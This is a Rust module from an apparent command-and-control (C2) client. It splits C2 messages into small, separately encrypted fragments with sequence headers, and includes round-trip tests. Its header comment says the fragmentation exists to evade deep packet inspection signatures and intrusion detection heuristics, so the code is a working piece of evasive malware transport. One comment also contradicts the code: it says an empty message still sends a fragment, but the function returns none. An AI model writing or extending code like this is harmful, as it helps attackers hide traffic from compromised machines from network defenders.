// transport/fragment.rs
// 🛡️ Phase 2: Message Fragmentation — split large payloads into smaller chunks
//
// Split large C2 messages into configurable-size chunks to avoid:
// 1. DPI signature detection on large fixed-size packets
// 2. IDS heuristics flagging "unusually large encrypted payloads"
// 3. Network MTU issues on restrictive middleboxes
//
// Each fragment is independently encrypted and has a sequence header,
// so loss of one fragment doesn't corrupt the entire message (if reassembly
// is implemented at the protocol layer above this module).

use crate::crypto;
use crate::error::{ClientError, Result};

/// Default maximum fragment size (4KB — well under common MTU and DPI thresholds)
pub const DEFAULT_MAX_FRAGMENT_SIZE: usize = 4096;

/// Fragment header: [seq (4 bytes BE) | total (4 bytes BE) | flags (1 byte)]
const FRAG_HEADER_SIZE: usize = 9;

/// Flags for fragment handling
const FRAG_FLAG_MORE: u8 = 0x01; // More fragments follow
const FRAG_FLAG_LAST: u8 = 0x02; // This is the last fragment

/// A single fragment containing metadata + encrypted payload
#[derive(Debug)]
pub struct Fragment {
    /// Sequence number (0-based)
    pub seq: u32,
    /// Total number of fragments
    pub total: u32,
    /// Raw bytes: [seq(4) || total(4) || flags(1) || ciphertext...]
    pub data: Vec<u8>,
}

/// Split a plaintext message into encrypted fragments.
/// Each fragment is independently encrypted with a fresh nonce.
///
/// # Security
/// - Each fragment uses a unique nonce (sequential counter mixed with random)
/// - No two fragments share the same keystream
/// - Tampering with any fragment causes GCM auth failure on that fragment
///
/// # Arguments
/// * `plaintext` — the full message to split
/// * `key` — 32-byte AES-256 key
/// * `max_size` — maximum size of each fragment body (excluding header)
pub fn fragment_message(plaintext: &[u8], key: &[u8], max_size: usize) -> Result<Vec<Fragment>> {
    if key.len() != 32 {
        return Err(ClientError::ConnectionError(
            "Invalid key length for fragmentation".into(),
        ));
    }

    let max_body = if max_size > FRAG_HEADER_SIZE {
        max_size - FRAG_HEADER_SIZE
    } else {
        DEFAULT_MAX_FRAGMENT_SIZE - FRAG_HEADER_SIZE
    };

    // Ensure minimum body size
    let max_body = max_body.max(64);

    let total = ((plaintext.len() + max_body - 1) / max_body) as u32;
    if total == 0 {
        // Empty message — still send one fragment
        return Ok(vec![]);
    }

    let mut fragments = Vec::with_capacity(total as usize);
    let mut offset = 0;

    for seq in 0..total {
        let remaining = plaintext.len() - offset;
        let chunk_size = remaining.min(max_body);
        let chunk = &plaintext[offset..offset + chunk_size];
        offset += chunk_size;

        let is_last = seq == total - 1;
        let flags = if is_last {
            FRAG_FLAG_LAST
        } else {
            FRAG_FLAG_MORE
        };

        // Encrypt the chunk
        let ciphertext = crypto::encrypt(chunk, key);
        if ciphertext.is_empty() {
            return Err(ClientError::ConnectionError(
                "message encryption failed".into(),
            ));
        }

        // Build fragment: [seq || total || flags || ciphertext]
        let mut data = Vec::with_capacity(FRAG_HEADER_SIZE + ciphertext.len());
        data.extend_from_slice(&seq.to_be_bytes());
        data.extend_from_slice(&total.to_be_bytes());
        data.push(flags);
        data.extend_from_slice(&ciphertext);

        fragments.push(Fragment { seq, total, data });
    }

    Ok(fragments)
}

/// Reassemble fragments back into a single plaintext message.
/// Fragments must be provided in order (or sorted before calling).
///
/// # Security
/// - Missing fragments cause immediate failure
/// - Out-of-order fragments are rejected (to prevent replay/reordering attacks)
/// - Each fragment is independently decrypted and authenticated
///
/// # Arguments
/// * `fragments` — ordered list of fragment data (raw bytes from wire)
/// * `key` — 32-byte AES-256 key
pub fn reassemble_message(fragments: &[Vec<u8>], key: &[u8]) -> Result<Vec<u8>> {
    if key.len() != 32 {
        return Err(ClientError::ConnectionError(
            "Invalid key length for reassembly".into(),
        ));
    }

    if fragments.is_empty() {
        return Ok(Vec::new());
    }

    let mut plaintext = Vec::new();
    let mut expected_seq = 0u32;

    for (idx, frag) in fragments.iter().enumerate() {
        if frag.len() < FRAG_HEADER_SIZE {
            return Err(ClientError::ConnectionError(format!(
                "Fragment {} too short: {} bytes",
                idx,
                frag.len()
            )));
        }

        let seq = u32::from_be_bytes([frag[0], frag[1], frag[2], frag[3]]);
        let total = u32::from_be_bytes([frag[4], frag[5], frag[6], frag[7]]);
        let _flags = frag[8];
        let ciphertext = &frag[FRAG_HEADER_SIZE..];

        if seq != expected_seq {
            return Err(ClientError::ConnectionError(format!(
                "Fragment out of order: expected seq {}, got {}",
                expected_seq, seq
            )));
        }

        if total as usize != fragments.len() {
            return Err(ClientError::ConnectionError(format!(
                "Fragment count mismatch: expected {}, got {}",
                total,
                fragments.len()
            )));
        }

        // Decrypt this fragment's ciphertext
        let decrypted = crypto::decrypt(ciphertext, key).map_err(|e| {
            ClientError::ConnectionError(format!("frame {} open failed: {}", seq, e))
        })?;

        plaintext.extend_from_slice(&decrypted);
        expected_seq += 1;
    }

    Ok(plaintext)
}

/// Check if a message needs fragmentation (exceeds threshold)
pub fn should_fragment(plaintext_len: usize, max_size: usize) -> bool {
    // Conservative: fragment if plaintext + overhead would exceed max_size
    // Overhead per fragment: ~16 bytes (GCM tag) + FRAG_HEADER_SIZE
    let estimated_ciphertext = plaintext_len + 16 + FRAG_HEADER_SIZE;
    estimated_ciphertext > max_size
}

/// Iterator-like interface for streaming fragmentation
/// (used when memory is constrained and we can't buffer all fragments)
pub struct Fragmenter<'a> {
    plaintext: &'a [u8],
    key: &'a [u8],
    max_body: usize,
    seq: u32,
    total: u32,
    offset: usize,
}

impl<'a> Fragmenter<'a> {
    pub fn new(plaintext: &'a [u8], key: &'a [u8], max_size: usize) -> Self {
        let max_body = max_size.saturating_sub(FRAG_HEADER_SIZE).max(64);
        let total = ((plaintext.len() + max_body - 1) / max_body) as u32;
        Self {
            plaintext,
            key,
            max_body,
            seq: 0,
            total,
            offset: 0,
        }
    }

    /// Get the next fragment, or None if all fragments have been consumed
    pub fn next(&mut self) -> Result<Option<Fragment>> {
        if self.seq >= self.total {
            return Ok(None);
        }

        let remaining = self.plaintext.len() - self.offset;
        let chunk_size = remaining.min(self.max_body);
        let chunk = &self.plaintext[self.offset..self.offset + chunk_size];
        self.offset += chunk_size;

        let is_last = self.seq == self.total - 1;
        let flags = if is_last {
            FRAG_FLAG_LAST
        } else {
            FRAG_FLAG_MORE
        };

        let ciphertext = crypto::encrypt(chunk, self.key);
        if ciphertext.is_empty() {
            return Err(ClientError::ConnectionError(
                "message encryption failed".into(),
            ));
        }

        let mut data = Vec::with_capacity(FRAG_HEADER_SIZE + ciphertext.len());
        data.extend_from_slice(&self.seq.to_be_bytes());
        data.extend_from_slice(&self.total.to_be_bytes());
        data.push(flags);
        data.extend_from_slice(&ciphertext);

        let frag = Fragment {
            seq: self.seq,
            total: self.total,
            data,
        };

        self.seq += 1;
        Ok(Some(frag))
    }
}

// ============================================================================
// Tests
// ============================================================================
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fragment_roundtrip() {
        let key = b"01234567890123456789012345678901";
        let plaintext = b"Hello, this is a test message that might need fragmentation if it's very long. Let's make it long enough to split into multiple fragments. We need at least a few kilobytes to trigger fragmentation, so let's repeat this text a few more times. Here is some more text to pad out the message. More padding. More padding. More padding.";

        let fragments = fragment_message(plaintext, key, 128).unwrap();
        assert!(
            fragments.len() > 1,
            "Should have split into multiple fragments"
        );

        // Collect raw fragment data
        let raw_frags: Vec<Vec<u8>> = fragments.iter().map(|f| f.data.clone()).collect();

        let reassembled = reassemble_message(&raw_frags, key).unwrap();
        assert_eq!(&reassembled[..], plaintext);
    }

    #[test]
    fn test_single_fragment() {
        let key = b"01234567890123456789012345678901";
        let plaintext = b"Short message";

        let fragments = fragment_message(plaintext, key, 4096).unwrap();
        assert_eq!(fragments.len(), 1);

        let raw_frags: Vec<Vec<u8>> = fragments.iter().map(|f| f.data.clone()).collect();
        let reassembled = reassemble_message(&raw_frags, key).unwrap();
        assert_eq!(&reassembled[..], plaintext);
    }

    #[test]
    fn test_fragmenter_iterator() {
        let key = b"01234567890123456789012345678901";
        // Make plaintext larger than max_body to ensure multiple fragments
        let plaintext: Vec<u8> = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ".repeat(10);

        let mut fragmenter = Fragmenter::new(&plaintext, key, 64);
        let mut all_data = Vec::new();

        while let Some(frag) = fragmenter.next().unwrap() {
            all_data.push(frag.data);
        }

        assert!(all_data.len() > 1);
        let reassembled = reassemble_message(&all_data, key).unwrap();
        assert_eq!(&reassembled[..], plaintext);
    }
}
